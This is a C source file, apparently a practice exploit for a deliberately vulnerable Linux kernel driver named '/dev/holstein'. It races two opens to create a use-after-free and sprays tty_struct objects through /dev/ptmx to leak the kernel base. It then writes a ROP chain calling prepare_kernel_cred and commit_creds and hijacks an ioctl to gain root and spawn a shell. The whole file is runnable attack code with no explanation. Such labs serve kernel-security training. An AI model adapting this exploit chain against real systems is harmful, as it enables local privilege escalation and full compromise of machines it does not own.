#define _GNU_SOURCE
#include <fcntl.h>
#include <pthread.h>
#include <sched.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <unistd.h>

#define SPRAY_NUM 800
#define BUF_LEN 0x400

#define ofs_tty_ops 0xc3afe0
#define prepare_kernel_cred (kbase + 0x72580)
#define commit_creds (kbase + 0x723e0)
#define pop_rdi_ret (kbase + 0xb13fd)
#define pop_rcx_pop2_ret (kbase + 0x309948)
#define push_rdx_pop_rsp_pop_ret (kbase + 0x137da6)
#define mov_rdi_rax_rep_movsq_ret (kbase + 0x65094b)
#define swapgs_restore_regs_and_return_to_usermode (kbase + 0x800e26)

void spawn_shell();
uint64_t user_cs, user_ss, user_rflags, user_sp;
uint64_t user_rip = (uint64_t)spawn_shell;

unsigned long kbase;
unsigned long g_buf;

int win = 0;
long fd1, fd2;

void fatal(char *msg) {
  perror(msg);
  exit(-1);
}

void spawn_shell() {
  puts("[+] returned to user land");
  uid_t uid = getuid();
  if (uid == 0) {
    printf("[+] got root (uid = %d)\n", uid);
  } else {
    printf("[!] failed to get root (uid: %d)\n", uid);
    exit(-1);
  }
  puts("[*] spawning shell");
  system("/bin/sh");
  exit(0);
}

void save_userland_state() {
  puts("[*] saving user land state");
  __asm__(".intel_syntax noprefix;"
          "mov user_cs, cs;"
          "mov user_ss, ss;"
          "mov user_sp, rsp;"
          "pushf;"
          "pop user_rflags;"
          ".att_syntax");
}

void *race(void *arg) {
  cpu_set_t *cpu_set = (cpu_set_t *)arg;
  if (sched_setaffinity(gettid(), sizeof(cpu_set_t), cpu_set))
    fatal("sched_setaffinity");

  while (1) {
    while (!win) {
      int fd = open("/dev/holstein", O_RDWR);
      if (fd == fd2)
        win = 1;
      if (win == 0 && fd != -1)
        close(fd);
    }
    if (write(fd1, "A", 1) != 1 || write(fd2, "a", 1) != 1) {
      close(fd1);
      close(fd2);
      win = 0;
    } else
      break;
    usleep(1000);
  }
  return NULL;
}

void *spray_thread(void *arg) {
  cpu_set_t *cpu_set = (cpu_set_t *)arg;
  if (sched_setaffinity(gettid(), sizeof(cpu_set_t), cpu_set))
    fatal("sched_setaffinity");
  long x;
  long spray[SPRAY_NUM];

  printf("[*] spraying %d tty_struct objects\n", SPRAY_NUM);
  for (int i = 0; i < SPRAY_NUM; i++) {
    usleep(10);
    spray[i] = open("/dev/ptmx", O_RDONLY | O_NOCTTY);
    if (spray[i] == -1) {
      for (int j = 0; j < i; j++)
        close(spray[j]);
      return (void *)-1;
    }
    if (read(fd2, &x, sizeof(long)) == sizeof(long) && x) {
      for (int j = 0; j < i; j++)
        close(spray[j]);
      return (void *)spray[i];
    }
  }
  for (int i = 0; i < SPRAY_NUM; i++)
    close(spray[i]);
  return (void *)-1;
}

int create_overlap() {
  pthread_t th1, th2;
  char buf[0x10] = {0};
  cpu_set_t t1_cpu, t2_cpu;
  // cpu affinity
  CPU_ZERO(&t1_cpu);
  CPU_ZERO(&t2_cpu);
  CPU_SET(0, &t1_cpu);
  CPU_SET(1, &t2_cpu);

  puts("[*] opening /tmp to figure out next two fds");
  fd1 = open("/tmp", O_RDONLY);
  fd2 = open("/tmp", O_RDONLY);
  close(fd1);
  close(fd2);
  printf("[+] next two fds: fd1 <%ld>, fd2 <%ld>\n", fd1, fd2);

  puts("[*] running thread1 and thread2");
  pthread_create(&th1, NULL, race, (void *)&t1_cpu);
  pthread_create(&th2, NULL, race, (void *)&t2_cpu);
  pthread_join(th1, NULL);
  pthread_join(th2, NULL);

  puts("[+] reached race condition");
  puts("[*] checking whether this race condition is effective");
  write(fd1, "aptx4869", 9);
  read(fd2, buf, 9);
  if (strcmp(buf, "aptx4869") != 0) {
    puts("[-] bad luck :(");
    exit(1);
  }
  memset(buf, 0, 9);
  write(fd1, buf, 9);
  puts("[+] gotten effective race condtion");

  puts("[*] closing fd1 to create UAF situation");
  close(fd1); // create UAF

  long victim_fd = -1;
  victim_fd = (long)spray_thread((void *)&t1_cpu);
  while (victim_fd == -1) {
    puts("[*] spraying on another CPU");
    pthread_create(&th1, NULL, spray_thread, (void *)&t2_cpu);
    pthread_join(th1, (void *)&victim_fd);
  }

  printf("[+] overlapped victim fd <%d>\n", (int)victim_fd);
  return victim_fd;
}

int main() {
  char buf[BUF_LEN] = {0};
  save_userland_state();

  puts("[*] UAF #1");
  create_overlap();

  printf("[*] leaking kernel base and g_buf with tty_struct\n");
  read(fd2, buf, BUF_LEN); // read tty_struct
  kbase = *(unsigned long *)&buf[0x18] - ofs_tty_ops;
  g_buf = *(unsigned long *)&buf[0x38] - 0x38;

  if ((g_buf & 0xffffffff00000000) == 0xffffffff00000000) {
    printf("[-] heap spraying failed\n");
    exit(-1);
  }
  if (kbase & 0xfff) { // what and why?
    puts("[-] kbase is invalid; trying to fix it by adding 0x120");
    kbase += 0x120;
  }

  printf("[+] leaked kernel base address: 0x%lx\n", kbase);
  printf("[+] leaked g_buf address: 0x%lx\n", g_buf);

  // craft rop chain and fake function table
  printf("[*] crafting rop chain\n");
  unsigned long *chain = (unsigned long *)&buf;

  *chain++ = pop_rdi_ret;
  *chain++ = 0x0;
  *chain++ = prepare_kernel_cred;
  *chain++ = pop_rcx_pop2_ret;
  *chain++ = 0;
  *chain++ = 0;
  *chain++ = 0;
  *chain++ = mov_rdi_rax_rep_movsq_ret;
  *chain++ = commit_creds;
  *chain++ = swapgs_restore_regs_and_return_to_usermode;
  *chain++ = 0x0;
  *chain++ = 0x0;
  *chain++ = user_rip;
  *chain++ = user_cs;
  *chain++ = user_rflags;
  *chain++ = user_sp;
  *chain++ = user_ss;

  *(unsigned long *)&buf[0x3f8] = push_rdx_pop_rsp_pop_ret;

  printf("[*] overwriting tty_struct target-1 with rop chain and fake ioctl "
         "ops\n");
  write(fd2, buf, BUF_LEN);

  puts("[*] UAF #2");
  int victim_fd = create_overlap();

  printf("[*] overwriting tty_struct target-2 with fake tty_ops ptr\n");
  read(fd2, buf, 0x20);
  *(unsigned long *)&buf[0x18] = g_buf + 0x3f8 - 12 * 8;
  write(fd2, buf, 0x20);

  printf("[*] invoking ioctl to hijack control flow\n");
  // hijack control flow
  ioctl(victim_fd, 0, g_buf - 8);

  puts("[-] failed to exploit");

  return 0;
}